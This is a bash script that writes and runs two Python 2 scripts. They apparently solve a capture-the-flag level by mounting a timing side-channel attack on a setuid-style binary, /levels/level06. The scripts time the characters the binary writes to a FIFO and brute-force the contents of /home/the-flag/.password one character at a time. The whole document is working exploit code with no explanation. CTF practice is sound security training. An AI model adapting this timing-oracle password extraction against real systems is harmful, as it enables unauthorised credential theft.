#!/usr/bin/env bash
mkfifo fifo

cat > test.py <<EOF
import os
import time

THRESH = 9e-06
last = 0
correct = 0
count = 0
fd = os.open('fifo', os.O_RDONLY | os.O_NONBLOCK)
while(count < 200000):
  try:
    char = os.read(fd, 1)
    if char == '.':
      if last:
        elapsed = time.time() - last
        if elapsed < THRESH:
          correct += 1
          count = 0
          last = time.time()
        else:
          print correct
          os.close(fd)
          break
        time.time() - last
      else:
        last = time.time()
    count += 1
  except OSError:
    pass
EOF

cat > timing.py <<EOF
import commands
characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

solved = ''
for x in xrange(30):
  for character in characters:
    guess = solved + character
    result = ''
    while result == '':
      result = commands.getoutput('((sleep 0.1; /levels/level06  /home/the-flag/.password %s-- 2> fifo >/dev/null) &); python test.py' % guess)
    if int(result.strip()) == len(guess):
      solved += character
      break;
  print solved
  if 'Wait' in commands.getoutput('/levels/level06  /home/the-flag/.password %s' % solved):
    break
EOF

python timing.py
